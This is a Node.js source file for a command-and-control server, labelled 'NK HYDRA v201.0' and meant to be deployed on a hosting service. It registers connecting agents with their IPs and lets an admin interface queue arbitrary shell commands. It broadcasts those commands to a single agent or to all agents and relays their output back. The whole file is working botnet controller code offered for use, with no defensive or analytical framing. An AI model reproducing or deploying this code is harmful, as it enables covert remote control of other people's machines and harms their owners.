// TYPE: NODE.JS C2 SERVER (RUN ON RENDER)
// NK HYDRA v201.0 [SINGULARITY WATCHDOG + DEEP DIAGNOSTICS]

const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const cors = require('cors');

// --- 1. SYSTEM MONITOR (WATCHDOG BRAIN) ---
const getSystemMetrics = () => {
    const mem = process.memoryUsage();
    return {
        uptime: process.uptime(),
        memory_usage_mb: Math.round(mem.heapUsed / 1024 / 1024),
        cpu_load_percent: 0, // Node.js doesn't give direct CPU %, processed via Event Loop Lag
        event_loop_lag_ms: measureEventLoopLag(),
        active_sockets: 0 // Filled later
    };
};

// Simple event loop lag measure
let lastLoop = Date.now();
let currentLag = 0;
setInterval(() => {
    const now = Date.now();
    currentLag = now - lastLoop - 100; // 100ms interval
    if (currentLag < 0) currentLag = 0;
    lastLoop = now;
}, 100);
const measureEventLoopLag = () => currentLag;

// --- ANTI-CRASH HANDLERS ---
process.on('uncaughtException', (err) => {
    console.error('CRITICAL: Uncaught Exception:', err);
    logToAdmin('CRITICAL', 'Uncaught Exception: ' + err.message);
});

process.on('unhandledRejection', (reason, promise) => {
    console.error('CRITICAL: Unhandled Rejection:', reason);
    logToAdmin('CRITICAL', 'Unhandled Rejection: ' + String(reason));
});

const app = express();
app.use(cors());

// Health Check
app.get('/health', (req, res) => { res.status(200).send('OK'); });
app.get('/', (req, res) => { 
    res.json({ 
        status: 'online', 
        version: 'v201.0', 
        telemetry: getSystemMetrics(),
        agents: agents.length
    }); 
});

const server = http.createServer(app);
const io = new Server(server, { 
    cors: { origin: "*", methods: ["GET", "POST"] },
    pingInterval: 10000, // Faster pings to detect drops
    pingTimeout: 30000,
    maxHttpBufferSize: 1e8, // 100MB Buffer
    transports: ['polling', 'websocket'] 
});

let agents = []; 
const commandQueue = [];
let adminSocket = null; // The NK UI

// --- DEEP LOGGING ---
const logToAdmin = (level, message, details = {}) => {
    const logEntry = {
        timestamp: Date.now(),
        source: 'C2_KERNEL',
        level,
        message,
        details
    };
    if (adminSocket) {
        adminSocket.emit('agent_event', {
            type: 'TELEMETRY',
            agentId: 'C2',
            payload: logEntry
        });
    }
    console.log(`[${level}] ${message}`);
};

// --- TRAFFIC CONTROLLER (PREVENT FLOOD) ---
// If queue is huge, pause processing or warn NK
setInterval(() => {
    const metrics = getSystemMetrics();
    metrics.active_sockets = io.engine.clientsCount;
    
    if (metrics.memory_usage_mb > 400) {
        logToAdmin('WARNING', 'High Memory Usage Detected', metrics);
    }
    
    // Broadcast Health to UI every 5s
    if (adminSocket) {
        adminSocket.emit('c2_health', metrics);
    }
}, 5000);

let isProcessingQueue = false;
const processQueue = async () => {
    if (isProcessingQueue || commandQueue.length === 0) return;
    isProcessingQueue = true;

    while (commandQueue.length > 0) {
        const task = commandQueue.shift();
        if (task) {
            try {
                if (task.targetId === 'all') {
                    io.emit('exec_cmd', { cmd: task.cmd, id: task.id });
                } else {
                    const agent = agents.find(a => a.id === task.targetId);
                    if (agent && agent.socketId) {
                         io.to(agent.socketId).emit('exec_cmd', { cmd: task.cmd, id: task.id });
                    }
                }
            } catch (e) {
                logToAdmin('ERROR', 'Queue Execution Failed', { error: e.message });
            }
        }
        await new Promise(r => setTimeout(r, 200)); 
    }
    isProcessingQueue = false;
};

io.on('connection', (socket) => {
    
    socket.on('heartbeat', (data) => {
        const agent = agents.find(a => a.socketId === socket.id);
        if (agent) {
            agent.lastSeen = Date.now();
            if (data.cpu) agent.cpu = data.cpu;
            if (data.ram) agent.ram = data.ram;
        }
    });

    socket.on('identify', (data) => {
        try {
            if (data.type === 'ui') {
                socket.join('ui_room');
                adminSocket = socket;
                socket.emit('agents_list', agents);
                logToAdmin('INFO', 'NK UI Connected (God Mode Active)');
                return;
            }

            agents = agents.filter(a => a.id !== data.id);
            agents.push({ 
                ...data, 
                socketId: socket.id, 
                status: 'Online', 
                lastSeen: Date.now() 
            });
            
            io.to('ui_room').emit('agents_list', agents);
            logToAdmin('SUCCESS', `Agent Connected: ${data.id}`, { ip: data.ip });
            
            if(commandQueue.length > 0) processQueue();

        } catch (e) {
            console.error("Identify Error:", e);
        }
    });

    socket.on('exec_cmd', (data) => {
        try {
            const { targetId, cmd } = data;
            const id = Date.now().toString(); 
            commandQueue.push({ targetId, cmd, id });
            
            logToAdmin('INFO', `Command Queued: ${cmd}`, { target: targetId });
            processQueue();

        } catch (e) { console.error("Exec Error:", e); }
    });
    
    socket.on('agent_event', (data) => {
        try {
            // RELAY TO UI
            io.to('ui_room').emit('agent_event', data);
        } catch (e) { console.error("Relay Error:", e); }
    });

    socket.on('disconnect', (reason) => {
        const agent = agents.find(a => a.socketId === socket.id);
        if (agent) { 
            agent.status = 'Offline'; 
            io.to('ui_room').emit('agents_list', agents);
            logToAdmin('WARNING', `Agent Disconnected: ${agent.id}`, { reason });
        } else if (socket === adminSocket) {
            adminSocket = null;
        }
    });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => console.log(`HYDRA v201 LISTENING ON ${PORT}`));
